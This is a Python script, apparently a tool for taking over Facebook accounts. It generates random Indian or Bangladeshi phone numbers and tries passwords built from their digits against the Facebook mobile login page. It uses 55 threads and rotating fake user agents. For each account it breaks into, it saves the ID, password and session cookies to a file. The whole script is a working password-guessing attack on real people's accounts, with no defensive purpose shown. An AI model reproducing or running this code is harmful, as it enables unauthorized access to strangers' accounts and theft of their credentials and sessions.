import os,re,sys,uuid,random,requests,time,json
os.system("pip install fake-useragent")
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from fake_useragent import UserAgent


loop=0
oks=[]


logo="""
    ┏┳┓┏┓┏┓┏┳┓
     ┃ ┣ ┗┓ ┃ 
     ┻ ┗┛┗┛ ┻"""


#---HOST

#----------CK Update----------#

def usw():
    ua = UserAgent()
    return random.choice([ua.chrome,ua.firefox,ua.safari])



def main():
    user=[]
    os.system("clear")
    print(logo)
    print("—"*30)
    print("[1] India Random")
    print("[2] BD Random")
    print("—"*30)
    kkk=input("[✓] >")
    
    if "1" in kkk:
        pwx=["first6","57273200","first8","57575751","first10","59039200","last6","57575752"]
        print("—"*30)
        print(" CODE: 9848 9946 9832")
        print("—"*30)
        code=input("[!] -->")
        for i in range(10000):
            gg=str(random.choice(range(1000000,9999999)))
            user.append(gg)
    elif "2" in kkk:
        pwx=["first6","last6","first8","last8","last7","number"]
        #pwx=["last6"]
        
        print("—"*30)
        print(" CODE: 017 018 019 013")
        print("—"*30)
        code=input("[!] -->")
        for i in range(10000):
            gg=str(random.choice(range(10000000,99999999)))
            user.append(gg)
    else:main()
    with ThreadPool(max_workers=55) as update:
        os.system("clear")
        print(logo)
        print("—"*30)
        url=input("Put url: ")
        fb=url.split(".")[0]
        os.system("clear")
        print(logo)
        print("—"*30)
        print(f"  Method : "+fb)
        print("  Used Code "+code)
        print("—"*30)
        for xd in user:
            uid=code+xd
            update.submit(host,uid,pwx,fb,url)




def host(uid,pwx,fb,url):
    global oks,loop,hostua
    session=requests.Session()
    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[HERON]   {loop}⟩\x1b[38;5;155m{str(len(oks))}\r "),
    sys.stdout.flush()
    
    try:
        for pw in pwx:
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            free_fb = session.get('https://m.facebook.com').text
            data={
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'display': '',
            'isprivate': '',
            'return_session': '',
            'skip_api_login': '',
            'signed_next': '',
            'trynum': '1',
            'timezone': '-540',
            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
            'lgnrnd': '022859_xXwd',
            'lgnjs': '1718184538',
            'email': uid,
            'prefill_contact_point': '',
            'prefill_source': '',
            'prefill_type': '',
            'first_prefill_source': '',
            'first_prefill_type': '',
            'had_cp_prefilled': 'false',
            'had_password_prefilled': 'false',
            'ab_test_data': 'AAAAAVAA/AAAqqV/qAAV/VAVAAAAAAAVAAAAAAVAAL5/FiRAAALAAN',
            'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),ps)}
            head={
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding':'gzip, deflate, br, zstd',
            'Accept-Language':'en-US,en;q=0.9',
            'Cache-Control':'max-age=0',
            'Content-Type':'application/x-www-form-urlencoded',
            'Origin':'https://m.facebook.com',
            'Priority':'u=0, i',
            'Referer':'https://m.facebook.com/login/',
            'Sec-Ch-Ua':'"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'Sec-Ch-Ua-Mobile':'?0',
            'Sec-Ch-Ua-Platform':'"Windows"',
            'Sec-Fetch-Dest':'document',
            'Sec-Fetch-Mode':'navigate',
            'Sec-Fetch-Site':'same-origin',
            'Sec-Fetch-User':'?1',
            'Upgrade-Insecure-Requests':'1',
            'User-Agent':usw()}
            session.post(url,data=data,headers=head)
            heron_brand=session.cookies.get_dict().keys()
            
            if "c_user" in heron_brand:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xd=coki.split("c_user=")[1][:15].replace(";","")
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if 'Photoshop' in res:
                    print(f"\r\r[SUCCESSFUL] {xd} | {ps} | {coki}\n\n")
                    oks.append(xd)
                    open("/sdcard/test-ok.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                break
            elif "checkpoint" in heron_brand:
                print(f"\r\r [CHECKPOINT] {uid} | {ps}")
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)



main()




























